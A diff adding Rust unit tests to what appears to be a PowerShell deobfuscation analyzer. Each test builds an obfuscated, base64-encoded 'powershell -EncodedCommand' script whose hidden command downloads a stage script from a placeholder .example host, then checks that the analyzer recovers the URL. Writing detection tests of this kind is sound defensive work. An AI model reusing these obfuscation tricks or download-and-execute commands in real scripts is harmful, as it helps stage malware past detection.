@@ -23328,6 +23328,208 @@ Piece 'noise|{decoded}|tail' 1"#
     }
 
     #[test]
+    fn ps1_literal_constant_index_extractor_calls_recover_nested_command() {
+        use base64::Engine;
+
+        fn pick_calls(decoded: &str) -> String {
+            decoded
+                .chars()
+                .map(|ch| format!("(Pick 'x{ch}')"))
+                .collect::<Vec<_>>()
+                .join(" + ")
+        }
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-const-index-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Pick($value) {{
+  return $value[1]
+}}
+$cmd = {}
+Invoke-Expression $cmd"#,
+            pick_calls(decoded)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-const-index-extractor.example/stage.ps1"
+                )
+            }),
+            "literal constant index extractor calls were not recursively decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_constant_chars_extractor_calls_recover_nested_command() {
+        use base64::Engine;
+
+        fn pick_calls(decoded: &str) -> String {
+            decoded
+                .chars()
+                .map(|ch| format!("(Pick 'x{ch}')"))
+                .collect::<Vec<_>>()
+                .join(" + ")
+        }
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-const-chars-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Pick($value) {{
+  return $value.get_Chars(1)
+}}
+$cmd = {}
+Invoke-Expression $cmd"#,
+            pick_calls(decoded)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-const-chars-extractor.example/stage.ps1"
+                )
+            }),
+            "literal constant Chars/get_Chars extractor calls were not recursively decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_constant_tochararray_extractor_calls_recover_nested_command() {
+        use base64::Engine;
+
+        fn pick_calls(decoded: &str) -> String {
+            decoded
+                .chars()
+                .map(|ch| format!("(Pick 'x{ch}')"))
+                .collect::<Vec<_>>()
+                .join(" + ")
+        }
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-const-tochararray-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Pick($value) {{
+  return $value.ToCharArray()[1]
+}}
+$cmd = {}
+Invoke-Expression $cmd"#,
+            pick_calls(decoded)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-const-tochararray-extractor.example/stage.ps1"
+                )
+            }),
+            "literal constant ToCharArray index extractor calls were not recursively decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_constant_remove_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-const-remove-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Cut($value) {{
+  return $value.Remove(0,2)
+}}
+Cut 'xx{decoded}'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-const-remove-extractor.example/stage.ps1"
+                )
+            }),
+            "literal constant remove extractor call was not recursively decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_constant_insert_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-const-insert-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Add($value) {{
+  return $value.Insert(6,'-')
+}}
+Add '{}'"#,
+            decoded.replace("Invoke-", "Invoke")
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-const-insert-extractor.example/stage.ps1"
+                )
+            }),
+            "literal constant insert extractor call was not recursively decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_ireplace_literal_resolves_url() {
         let inner =
             r#"Invoke-WebRequest -Uri ('hxxps://ps-ireplace.example/stage' -ireplace 'xx','tt')"#;
